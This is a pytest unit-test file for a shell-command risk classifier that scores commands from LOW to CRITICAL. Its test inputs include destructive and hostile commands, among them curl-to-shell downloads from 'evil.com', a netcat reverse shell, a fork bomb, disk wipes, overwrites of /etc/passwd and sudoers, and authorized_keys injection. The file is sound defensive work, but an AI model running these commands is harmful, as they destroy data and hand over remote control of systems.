"""Unit tests for safe_run.risk module.

Covers rule-based risk detection patterns, severity scoring, RiskLevel
ordering, RiskAssessment properties, and edge cases.
"""

from __future__ import annotations

import re
from typing import List

import pytest

from safe_run.risk import (
    RISK_RULES,
    RiskAssessment,
    RiskLevel,
    RiskRule,
    assess_risk,
    get_risk_level_color,
    get_risk_level_emoji,
    _compute_aggregate_score,
    _dominant_level,
    _normalise_command,
)


# ---------------------------------------------------------------------------
# RiskLevel ordering tests
# ---------------------------------------------------------------------------


class TestRiskLevelOrdering:
    def test_low_less_than_medium(self) -> None:
        assert RiskLevel.LOW < RiskLevel.MEDIUM

    def test_medium_less_than_high(self) -> None:
        assert RiskLevel.MEDIUM < RiskLevel.HIGH

    def test_high_less_than_critical(self) -> None:
        assert RiskLevel.HIGH < RiskLevel.CRITICAL

    def test_critical_not_less_than_high(self) -> None:
        assert not (RiskLevel.CRITICAL < RiskLevel.HIGH)

    def test_low_le_low(self) -> None:
        assert RiskLevel.LOW <= RiskLevel.LOW

    def test_critical_ge_high(self) -> None:
        assert RiskLevel.CRITICAL >= RiskLevel.HIGH

    def test_medium_gt_low(self) -> None:
        assert RiskLevel.MEDIUM > RiskLevel.LOW

    def test_max_of_levels(self) -> None:
        levels = [RiskLevel.LOW, RiskLevel.CRITICAL, RiskLevel.MEDIUM]
        assert max(levels) == RiskLevel.CRITICAL

    def test_min_of_levels(self) -> None:
        levels = [RiskLevel.HIGH, RiskLevel.LOW, RiskLevel.CRITICAL]
        assert min(levels) == RiskLevel.LOW

    def test_string_value_low(self) -> None:
        assert RiskLevel.LOW.value == "LOW"

    def test_string_value_critical(self) -> None:
        assert RiskLevel.CRITICAL.value == "CRITICAL"


# ---------------------------------------------------------------------------
# RiskAssessment properties
# ---------------------------------------------------------------------------


class TestRiskAssessmentProperties:
    def _make_assessment(self, level: RiskLevel, score: int = 50) -> RiskAssessment:
        return RiskAssessment(
            level=level,
            score=score,
            reasons=["test reason"],
            matched_rules=["test_rule"],
            command="test command",
        )

    def test_low_not_dangerous(self) -> None:
        assert not self._make_assessment(RiskLevel.LOW).is_dangerous

    def test_medium_not_dangerous(self) -> None:
        assert not self._make_assessment(RiskLevel.MEDIUM).is_dangerous

    def test_high_is_dangerous(self) -> None:
        assert self._make_assessment(RiskLevel.HIGH).is_dangerous

    def test_critical_is_dangerous(self) -> None:
        assert self._make_assessment(RiskLevel.CRITICAL).is_dangerous

    def test_low_not_requires_confirmation(self) -> None:
        assert not self._make_assessment(RiskLevel.LOW).requires_confirmation

    def test_medium_not_requires_confirmation(self) -> None:
        assert not self._make_assessment(RiskLevel.MEDIUM).requires_confirmation

    def test_high_not_requires_confirmation(self) -> None:
        assert not self._make_assessment(RiskLevel.HIGH).requires_confirmation

    def test_critical_requires_confirmation(self) -> None:
        assert self._make_assessment(RiskLevel.CRITICAL).requires_confirmation

    def test_assessment_is_frozen(self) -> None:
        a = self._make_assessment(RiskLevel.LOW)
        with pytest.raises((AttributeError, TypeError)):
            a.level = RiskLevel.HIGH  # type: ignore[misc]


# ---------------------------------------------------------------------------
# _normalise_command
# ---------------------------------------------------------------------------


class TestNormaliseCommand:
    def test_strips_leading_whitespace(self) -> None:
        assert _normalise_command("  echo hello") == "echo hello"

    def test_strips_trailing_whitespace(self) -> None:
        assert _normalise_command("echo hello  ") == "echo hello"

    def test_collapses_internal_whitespace(self) -> None:
        assert _normalise_command("rm  -rf  /") == "rm -rf /"

    def test_collapses_tabs(self) -> None:
        assert _normalise_command("rm\t-rf\t/") == "rm -rf /"

    def test_collapses_newlines(self) -> None:
        assert _normalise_command("echo\nhello") == "echo hello"

    def test_empty_string(self) -> None:
        assert _normalise_command("") == ""

    def test_single_word(self) -> None:
        assert _normalise_command("ls") == "ls"


# ---------------------------------------------------------------------------
# _compute_aggregate_score
# ---------------------------------------------------------------------------


class TestComputeAggregateScore:
    def test_empty_list_returns_zero(self) -> None:
        assert _compute_aggregate_score([]) == 0

    def test_single_low_returns_low_score(self) -> None:
        assert _compute_aggregate_score([RiskLevel.LOW]) == 10

    def test_single_critical_returns_100(self) -> None:
        assert _compute_aggregate_score([RiskLevel.CRITICAL]) == 100

    def test_two_highs_above_single_high(self) -> None:
        single = _compute_aggregate_score([RiskLevel.HIGH])
        double = _compute_aggregate_score([RiskLevel.HIGH, RiskLevel.HIGH])
        assert double >= single

    def test_score_capped_at_100(self) -> None:
        many_criticals = [RiskLevel.CRITICAL] * 20
        assert _compute_aggregate_score(many_criticals) == 100

    def test_mixed_levels_max_dominates(self) -> None:
        score = _compute_aggregate_score([RiskLevel.LOW, RiskLevel.CRITICAL])
        assert score >= _compute_aggregate_score([RiskLevel.CRITICAL])


# ---------------------------------------------------------------------------
# _dominant_level
# ---------------------------------------------------------------------------


class TestDominantLevel:
    def test_single_level(self) -> None:
        assert _dominant_level([RiskLevel.MEDIUM]) == RiskLevel.MEDIUM

    def test_mixed_returns_max(self) -> None:
        levels = [RiskLevel.LOW, RiskLevel.HIGH, RiskLevel.MEDIUM]
        assert _dominant_level(levels) == RiskLevel.HIGH

    def test_all_same_returns_that_level(self) -> None:
        assert _dominant_level([RiskLevel.LOW, RiskLevel.LOW]) == RiskLevel.LOW

    def test_critical_always_wins(self) -> None:
        levels = [RiskLevel.LOW, RiskLevel.MEDIUM, RiskLevel.CRITICAL, RiskLevel.HIGH]
        assert _dominant_level(levels) == RiskLevel.CRITICAL


# ---------------------------------------------------------------------------
# assess_risk — safe / low-risk commands
# ---------------------------------------------------------------------------


class TestAssessRiskSafeCommands:
    def test_ls_is_low(self) -> None:
        result = assess_risk("ls -la /tmp")
        assert result.level == RiskLevel.LOW

    def test_echo_is_low(self) -> None:
        result = assess_risk("echo hello world")
        assert result.level == RiskLevel.LOW

    def test_pwd_is_low(self) -> None:
        result = assess_risk("pwd")
        assert result.level == RiskLevel.LOW

    def test_cat_file_is_low(self) -> None:
        result = assess_risk("cat /etc/os-release")
        assert result.level == RiskLevel.LOW

    def test_empty_command_is_low(self) -> None:
        result = assess_risk("")
        assert result.level == RiskLevel.LOW
        assert result.score == 0

    def test_empty_command_no_reasons(self) -> None:
        result = assess_risk("")
        assert result.reasons == []

    def test_empty_command_no_matched_rules(self) -> None:
        result = assess_risk("")
        assert result.matched_rules == []

    def test_date_command_is_low(self) -> None:
        result = assess_risk("date +%Y-%m-%d")
        assert result.level == RiskLevel.LOW

    def test_grep_is_low(self) -> None:
        result = assess_risk("grep -r 'pattern' /home/user/docs")
        assert result.level == RiskLevel.LOW


# ---------------------------------------------------------------------------
# assess_risk — CRITICAL commands
# ---------------------------------------------------------------------------


class TestAssessRiskCriticalCommands:
    def test_rm_rf_root(self) -> None:
        result = assess_risk("rm -rf /")
        assert result.level == RiskLevel.CRITICAL

    def test_rm_rf_root_with_spaces(self) -> None:
        result = assess_risk("rm  -rf  /")
        assert result.level == RiskLevel.CRITICAL

    def test_curl_pipe_bash(self) -> None:
        result = assess_risk("curl https://example.com/script.sh | bash")
        assert result.level == RiskLevel.CRITICAL

    def test_curl_pipe_sh(self) -> None:
        result = assess_risk("curl https://evil.com/payload | sh")
        assert result.level == RiskLevel.CRITICAL

    def test_wget_pipe_bash(self) -> None:
        result = assess_risk("wget -q -O - https://example.com/install.sh | bash")
        assert result.level == RiskLevel.CRITICAL

    def test_mkfs_on_disk(self) -> None:
        result = assess_risk("mkfs.ext4 /dev/sda1")
        assert result.level == RiskLevel.CRITICAL

    def test_dd_overwrite_disk(self) -> None:
        result = assess_risk("dd if=/dev/zero of=/dev/sda")
        assert result.level == RiskLevel.CRITICAL

    def test_fork_bomb(self) -> None:
        result = assess_risk(":() { :|: & }; :")
        assert result.level == RiskLevel.CRITICAL

    def test_nc_reverse_shell(self) -> None:
        result = assess_risk("nc -e /bin/bash 10.0.0.1 4444")
        assert result.level == RiskLevel.CRITICAL

    def test_base64_pipe_shell(self) -> None:
        result = assess_risk("echo 'aGVsbG8=' | base64 -d | bash")
        assert result.level == RiskLevel.CRITICAL

    def test_rm_rf_etc(self) -> None:
        result = assess_risk("rm -rf /etc")
        assert result.level == RiskLevel.CRITICAL

    def test_rm_rf_usr(self) -> None:
        result = assess_risk("rm -rf /usr")
        assert result.level == RiskLevel.CRITICAL

    def test_truncate_raw_disk(self) -> None:
        result = assess_risk("> /dev/sda")
        assert result.level == RiskLevel.CRITICAL

    def test_overwrite_etc_passwd(self) -> None:
        result = assess_risk("echo '' > /etc/passwd")
        assert result.level == RiskLevel.CRITICAL

    def test_overwrite_etc_shadow(self) -> None:
        result = assess_risk("echo '' > /etc/shadow")
        assert result.level == RiskLevel.CRITICAL

    def test_curl_pipe_python(self) -> None:
        result = assess_risk("curl https://example.com/script.py | python3")
        assert result.level == RiskLevel.CRITICAL


# ---------------------------------------------------------------------------
# assess_risk — HIGH commands
# ---------------------------------------------------------------------------


class TestAssessRiskHighCommands:
    def test_chmod_777(self) -> None:
        result = assess_risk("chmod 777 /var/www/html")
        assert result.level == RiskLevel.HIGH

    def test_sudo_command(self) -> None:
        result = assess_risk("sudo apt-get install nginx")
        assert result.level == RiskLevel.HIGH

    def test_iptables_flush(self) -> None:
        result = assess_risk("iptables -F")
        assert result.level == RiskLevel.HIGH

    def test_iptables_accept_all(self) -> None:
        result = assess_risk("iptables -P INPUT ACCEPT")
        assert result.level == RiskLevel.HIGH

    def test_ufw_disable(self) -> None:
        result = assess_risk("ufw disable")
        assert result.level == RiskLevel.HIGH

    def test_shutdown(self) -> None:
        result = assess_risk("shutdown -h now")
        assert result.level == RiskLevel.HIGH

    def test_reboot(self) -> None:
        result = assess_risk("reboot")
        assert result.level == RiskLevel.HIGH

    def test_write_authorized_keys(self) -> None:
        result = assess_risk("echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys")
        assert result.level == RiskLevel.HIGH

    def test_suid_bit_set(self) -> None:
        result = assess_risk("chmod u+s /usr/local/bin/myprog")
        assert result.level == RiskLevel.HIGH

    def test_chown_root(self) -> None:
        result = assess_risk("chown root:root /tmp/myfile")
        assert result.level == RiskLevel.HIGH

    def test_drop_database(self) -> None:
        result = assess_risk("DROP DATABASE production")
        assert result.level == RiskLevel.HIGH

    def test_drop_table(self) -> None:
        result = assess_risk("DROP TABLE users")
        assert result.level == RiskLevel.HIGH

    def test_visudo(self) -> None:
        result = assess_risk("echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers")
        assert result.level == RiskLevel.HIGH

    def test_crontab_edit(self) -> None:
        result = assess_risk("crontab -e")
        assert result.level == RiskLevel.HIGH

    def test_systemctl_stop_ssh(self) -> None:
        result = assess_risk("systemctl stop ssh")
        assert result.level == RiskLevel.HIGH

    def test_pipe_to_sudo(self) -> None:
        result = assess_risk("cat config.sh | sudo bash")
        assert result.level in (RiskLevel.HIGH, RiskLevel.CRITICAL)

    def test_history_wipe(self) -> None:
        result = assess_risk("history -c")
        assert result.level == RiskLevel.HIGH

    def test_rm_rf_general(self) -> None:
        result = assess_risk("rm -rf /tmp/mydir")
        assert result.level in (RiskLevel.HIGH, RiskLevel.CRITICAL)


# ---------------------------------------------------------------------------
# assess_risk — MEDIUM commands
# ---------------------------------------------------------------------------


class TestAssessRiskMediumCommands:
    def test_curl_insecure(self) -> None:
        result = assess_risk("curl -k https://example.com")
        assert result.level == RiskLevel.MEDIUM

    def test_wget_no_check_cert(self) -> None:
        result = assess_risk("wget --no-check-certificate https://example.com")
        assert result.level == RiskLevel.MEDIUM

    def test_git_force_push(self) -> None:
        result = assess_risk("git push origin main --force")
        assert result.level == RiskLevel.MEDIUM

    def test_git_reset_hard(self) -> None:
        result = assess_risk("git reset --hard HEAD~3")
        assert result.level == RiskLevel.MEDIUM

    def test_git_clean_force(self) -> None:
        result = assess_risk("git clean -fd")
        assert result.level == RiskLevel.MEDIUM

    def test_chmod_recursive(self) -> None:
        result = assess_risk("chmod -R 755 /var/www")
        assert result.level == RiskLevel.MEDIUM

    def test_eval_command(self) -> None:
        result = assess_risk("eval \"$(some_command)\"")
        assert result.level == RiskLevel.MEDIUM

    def test_nmap_scan(self) -> None:
        result = assess_risk("nmap -sV 192.168.1.0/24")
        assert result.level == RiskLevel.MEDIUM

    def test_env_credentials(self) -> None:
        result = assess_risk("API_KEY=secret123 curl https://api.example.com")
        assert result.level == RiskLevel.MEDIUM

    def test_password_in_env(self) -> None:
        result = assess_risk("PASSWORD=hunter2 ./deploy.sh")
        assert result.level == RiskLevel.MEDIUM

    def test_rsync_delete(self) -> None:
        result = assess_risk("rsync -av --delete src/ dest/")
        assert result.level == RiskLevel.MEDIUM

    def test_xargs_rm(self) -> None:
        result = assess_risk("find . -name '*.tmp' | xargs rm")
        assert result.level == RiskLevel.MEDIUM

    def test_find_delete(self) -> None:
        result = assess_risk("find /tmp -name '*.log' -delete")
        assert result.level == RiskLevel.MEDIUM

    def test_useradd(self) -> None:
        result = assess_risk("useradd -m newuser")
        assert result.level == RiskLevel.MEDIUM

    def test_userdel(self) -> None:
        result = assess_risk("userdel -r olduser")
        assert result.level == RiskLevel.MEDIUM

    def test_passwd(self) -> None:
        result = assess_risk("passwd myuser")
        assert result.level == RiskLevel.MEDIUM

    def test_ssh_no_host_check(self) -> None:
        result = assess_risk("ssh -o StrictHostKeyChecking=no user@host")
        assert result.level == RiskLevel.MEDIUM


# ---------------------------------------------------------------------------
# assess_risk — LOW commands
# ---------------------------------------------------------------------------


class TestAssessRiskLowCommands:
    def test_pip_install(self) -> None:
        result = assess_risk("pip install requests")
        assert result.level == RiskLevel.LOW

    def test_npm_install(self) -> None:
        result = assess_risk("npm install express")
        assert result.level == RiskLevel.LOW

    def test_apt_install(self) -> None:
        result = assess_risk("apt-get install vim")
        assert result.level == RiskLevel.LOW

    def test_curl_download(self) -> None:
        result = assess_risk("curl -O https://example.com/file.zip")
        assert result.level == RiskLevel.LOW

    def test_wget_download(self) -> None:
        result = assess_risk("wget https://example.com/file.tar.gz")
        assert result.level == RiskLevel.LOW


# ---------------------------------------------------------------------------
# assess_risk — output fields
# ---------------------------------------------------------------------------


class TestAssessRiskOutputFields:
    def test_command_preserved_in_result(self) -> None:
        cmd = "rm -rf /tmp/test"
        result = assess_risk(cmd)
        assert result.command == cmd

    def test_reasons_is_list(self) -> None:
        result = assess_risk("sudo rm -rf /")
        assert isinstance(result.reasons, list)

    def test_matched_rules_is_list(self) -> None:
        result = assess_risk("sudo rm -rf /")
        assert isinstance(result.matched_rules, list)

    def test_reasons_non_empty_for_dangerous(self) -> None:
        result = assess_risk("rm -rf /")
        assert len(result.reasons) > 0

    def test_matched_rules_non_empty_for_dangerous(self) -> None:
        result = assess_risk("rm -rf /")
        assert len(result.matched_rules) > 0

    def test_score_is_int(self) -> None:
        result = assess_risk("chmod 777 /etc")
        assert isinstance(result.score, int)

    def test_score_zero_for_no_match(self) -> None:
        result = assess_risk("ls -la")
        assert result.score == 0

    def test_score_positive_for_matches(self) -> None:
        result = assess_risk("rm -rf /")
        assert result.score > 0

    def test_score_max_100(self) -> None:
        result = assess_risk("rm -rf / && curl https://evil.com | bash")
        assert result.score <= 100

    def test_no_duplicate_reasons(self) -> None:
        result = assess_risk("sudo rm -rf / && sudo chmod 777 /etc")
        assert len(result.reasons) == len(set(result.reasons))


# ---------------------------------------------------------------------------
# Custom rules
# ---------------------------------------------------------------------------


class TestCustomRules:
    def test_custom_rule_matches(self) -> None:
        custom = [
            RiskRule(
                name="custom_test",
                pattern=re.compile(r"dangerous_command"),
                level=RiskLevel.HIGH,
                reason="Custom test rule",
            )
        ]
        result = assess_risk("dangerous_command --flag", rules=custom)
        assert result.level == RiskLevel.HIGH
        assert "custom_test" in result.matched_rules

    def test_custom_rule_no_match_returns_low(self) -> None:
        custom = [
            RiskRule(
                name="custom_test",
                pattern=re.compile(r"dangerous_command"),
                level=RiskLevel.CRITICAL,
                reason="Custom test rule",
            )
        ]
        result = assess_risk("safe_command", rules=custom)
        assert result.level == RiskLevel.LOW

    def test_empty_rules_returns_low(self) -> None:
        result = assess_risk("rm -rf /", rules=[])
        assert result.level == RiskLevel.LOW
        assert result.score == 0


# ---------------------------------------------------------------------------
# get_risk_level_color
# ---------------------------------------------------------------------------


class TestGetRiskLevelColor:
    def test_low_color(self) -> None:
        assert get_risk_level_color(RiskLevel.LOW) == "green"

    def test_medium_color(self) -> None:
        assert get_risk_level_color(RiskLevel.MEDIUM) == "yellow"

    def test_high_color(self) -> None:
        color = get_risk_level_color(RiskLevel.HIGH)
        assert "orange" in color or color == "orange3"

    def test_critical_color(self) -> None:
        color = get_risk_level_color(RiskLevel.CRITICAL)
        assert "red" in color


# ---------------------------------------------------------------------------
# get_risk_level_emoji
# ---------------------------------------------------------------------------


class TestGetRiskLevelEmoji:
    def test_returns_string_for_all_levels(self) -> None:
        for level in RiskLevel:
            emoji = get_risk_level_emoji(level)
            assert isinstance(emoji, str)
            assert len(emoji) > 0

    def test_different_emojis_for_different_levels(self) -> None:
        emojis = {get_risk_level_emoji(lvl) for lvl in RiskLevel}
        assert len(emojis) == len(list(RiskLevel))


# ---------------------------------------------------------------------------
# RISK_RULES sanity checks
# ---------------------------------------------------------------------------


class TestRiskRulesSanity:
    def test_at_least_30_rules(self) -> None:
        assert len(RISK_RULES) >= 30

    def test_all_rules_have_unique_names(self) -> None:
        names = [r.name for r in RISK_RULES]
        assert len(names) == len(set(names)), "Duplicate rule names found"

    def test_all_rules_have_non_empty_reason(self) -> None:
        for rule in RISK_RULES:
            assert rule.reason, f"Rule {rule.name!r} has empty reason"

    def test_all_rules_have_compiled_patterns(self) -> None:
        for rule in RISK_RULES:
            assert hasattr(rule.pattern, "search"), (
                f"Rule {rule.name!r} has invalid pattern"
            )

    def test_all_rules_have_valid_levels(self) -> None:
        valid = set(RiskLevel)
        for rule in RISK_RULES:
            assert rule.level in valid, (
                f"Rule {rule.name!r} has invalid level {rule.level!r}"
            )

    def test_has_at_least_one_critical_rule(self) -> None:
        critical_rules = [r for r in RISK_RULES if r.level == RiskLevel.CRITICAL]
        assert len(critical_rules) >= 5

    def test_has_at_least_one_high_rule(self) -> None:
        high_rules = [r for r in RISK_RULES if r.level == RiskLevel.HIGH]
        assert len(high_rules) >= 5

    def test_has_at_least_one_medium_rule(self) -> None:
        medium_rules = [r for r in RISK_RULES if r.level == RiskLevel.MEDIUM]
        assert len(medium_rules) >= 5

    def test_has_at_least_one_low_rule(self) -> None:
        low_rules = [r for r in RISK_RULES if r.level == RiskLevel.LOW]
        assert len(low_rules) >= 1
